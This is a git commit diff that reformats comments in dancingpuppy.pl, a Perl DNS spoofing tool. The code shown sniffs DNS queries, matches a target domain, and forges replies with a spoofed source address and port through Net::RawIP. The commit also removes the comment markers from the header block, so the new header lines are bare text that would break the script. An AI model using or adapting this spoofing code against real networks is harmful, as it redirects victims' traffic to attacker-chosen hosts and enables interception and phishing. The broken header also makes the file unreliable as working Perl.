8456239ac4a65c1defe9d8a9c1fd1ba28d4d92bd
xgeoffellis <xgeoffellis@users.noreply.github.com>
2015-07-06 18:38:40 +1000

    Comment Formatting Updated

--- dancingpuppy.pl
+++ dancingpuppy.pl
@@ -1,14 +1,9 @@
-##################################
-##################################
-##								##
-## Filename: dancingpuppy.pl	##
-## Developer: Geoff Ellis		##
-## Version: 0.01a				##
-##								##
-## Args: domain ipaddr			##
-##								##
-##################################
-##################################
+###########################
+Filename: dancingpuppy.pl
+Developer: Geoff Ellis
+Version: 0.01a
+Args: domain ipaddr
+###########################
 
 use NetPacket::Ethernet qw(:strip);
 use NetPacket::IP;
@@ -24,16 +19,16 @@ sub process_pkt {
 	my ($user_data,$header,$packet) = @_;
 
     $ip = NetPacket::IP->decode(eth_strip($packet));
-   	$srcip = $ip->{src_ip}; 						# Source IP of the captured packet
-   	$dstip = $ip->{dest_ip};						# Destination IP of the captured packet
+   	$srcip = $ip->{src_ip}; 					# Source IP of the captured packet
+   	$dstip = $ip->{dest_ip};					# Destination IP of the captured packet
 
    	$udp = NetPacket::UDP->decode($ip->{data});
    	$srcport = $udp->{src_port};					# Source Port of the captured packet
    	$dstport = $udp->{dest_port};					# Destination Port of the captured packet
 
-   	if($dstport == 53) {							# Check that the packet is destined for a DNS server
+   	if($dstport == 53) {						# Check that the packet is destined for a DNS server
         $payload = $udp->{data};
-		$tid = unpack('n', substr($payload,0,2));	# Get the transaction ID from within the payload
+		$tid = unpack('n', substr($payload,0,2));		# Get the transaction ID from within the payload
 		$payload =~s/[\x00-\x1F]+/./g;				# Convert all non-printable characters to ASCII
 		if ($payload =~ /$target/) {				# Check the payload for our target domain      				       
 		    my $dns_response = Net::DNS::Packet->new($target, "A", "IN");
@@ -45,12 +40,12 @@ sub process_pkt {
 
 			my $udp_response = new Net::RawIP({
                	ip=> {
-					saddr=>$dstip,		# Set the source address from the destination IP
-					daddr=>$srcip		# Set the destination address from the source IP
+					saddr=>$dstip,			# Set the source address from the destination IP
+					daddr=>$srcip			# Set the destination address from the source IP
 				},
 				udp=>{
-					source=>$dstport,	# Set the source port from the destination port
-					dest=>$srcport		# Set the destination port from the source port
+					source=>$dstport,		# Set the source port from the destination port
+					dest=>$srcport			# Set the destination port from the source port
 				}
 			});
 			$udp_response->set({
